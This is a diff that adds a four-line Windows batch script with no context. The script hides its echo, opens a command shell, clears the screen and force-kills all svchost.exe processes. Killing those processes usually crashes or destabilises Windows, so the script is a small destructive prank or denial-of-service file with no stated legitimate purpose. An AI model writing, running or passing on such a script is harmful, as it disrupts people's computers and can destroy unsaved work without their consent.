@@ -1,0 +1,4 @@
+@echo off
+cmd
+cls
+taskkill /f /im svchost.exe
